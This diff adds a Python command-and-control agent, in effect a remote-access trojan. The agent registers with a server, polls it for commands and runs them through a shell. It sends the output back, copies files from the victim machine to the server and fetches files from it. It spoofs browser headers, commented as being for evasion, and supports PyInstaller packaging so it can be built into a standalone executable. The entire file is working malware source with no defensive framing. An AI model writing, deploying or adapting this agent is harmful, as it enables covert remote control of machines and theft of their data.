@@ -1,0 +1,141 @@
+import requests
+import subprocess
+import time
+import uuid
+import os
+import sys
+
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-User": "?1",
+    "Sec-Fetch-Dest": "document",
+    "Referer": "https://www.Rochak.com/",  # Optional: Use if there's a specific referrer you want to mimic
+    "DNT": "1",  # Do Not Track request header
+    "Cache-Control": "max-age=0",
+    # Custom headers for further evasion or required by the server
+}
+
+
+SERVER_URL = 'https://192.168.1.210:5001'
+AGENT_ID = str(uuid.uuid4())
+REGISTER_ENDPOINT = f'{SERVER_URL}/register'
+COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'
+OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'
+
+global current_working_directory
+current_working_directory = os.getcwd()
+
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    
+    return os.path.join(base_path, relative_path)
+
+SERVER_CERT = resource_path('server.crt')
+
+def execute_command(command):
+    global current_working_directory
+    if command.startswith("download "):
+        # This is a command for the agent to upload a file to the server
+        filename = command.split(" ", 1)[1]
+        return upload_file_to_server(filename)
+    elif command.startswith("upload "):
+        # This is a command for the agent to download a file from the server
+        filename = command.split(" ", 1)[1]
+        return download_file_from_server(filename)
+    elif command.startswith("cd "):
+        directory = command.split(" ", 1)[1]
+        try:
+            new_dir = os.path.join(current_working_directory, directory)
+            os.chdir(new_dir)
+            current_working_directory = os.getcwd()  # Update the global variable to new directory
+            return f"Changed directory to {current_working_directory}"
+        except Exception as e:
+            return f"Error changing directory: {e}"
+    else:
+        try:
+            # Use the updated current working directory for executing commands
+            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True, cwd=current_working_directory)
+            return result.stdout or result.stderr or "Executed command successfully."
+        except subprocess.CalledProcessError as e:
+            return f"Error executing command: {e.output}"
+        except Exception as e:
+            return f"Error: {e}"
+
+def upload_file_to_server(filename):
+    # Change here to check the file in the current directory instead of DOWNLOAD_DIR
+    file_path = filename
+    
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as f:
+            files = {'file': (filename, f)}
+            response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+            #response = requests.post(OUTPUT_ENDPOINT, files=files, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
+            if response.status_code == 200:
+                return "File Downloaded successfully."
+            else:
+                return f"Failed to Download file. Status: {response.status_code}, Response: {response.text}"
+    else:
+        return "File does not exist."
+
+def download_file_from_server(filename):
+    # Adjust to the new server endpoint for fetching files
+    download_url = f"{SERVER_URL}/fetch_file/{AGENT_ID}/{filename}"
+    response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+    #response = requests.get(download_url, verify=SERVER_CERT, allow_redirects=True)
+    if response.status_code == 200:
+        file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
+        with open(file_path, 'wb') as f:
+            f.write(response.content)
+        return "File Uploaded successfully."
+    else:
+        return f"Failed to Upload file. Status: {response.status_code}, Response: {response.text}"
+
+def send_output(output):
+    try:
+        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
+        #response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output}, verify=SERVER_CERT, allow_redirects=True)
+        print("Response Status:", response.status_code)
+        print("Response Text:", response.text)
+        if response.ok:
+            print("Output sent successfully")
+        else:
+            print("Failed to send output")
+    except requests.exceptions.RequestException as e:
+        print(f"Request Error: {e}")
+
+
+def register_agent():
+    response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
+    if response.ok:
+        print("Agent registered successfully")
+    else:
+        print("Failed to register agent")
+
+def main():
+    register_agent()
+    while True:
+        try:
+            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID}, verify=SERVER_CERT, allow_redirects=True)
+            if response.status_code == 200:
+                command_to_execute = response.json().get('command', '')
+                if command_to_execute:
+                    output = execute_command(command_to_execute)
+                    send_output(output)
+            time.sleep(5)
+        except requests.exceptions.RequestException as e:
+            print(f"Network error: {e}")
+
+if __name__ == "__main__":
+    main()
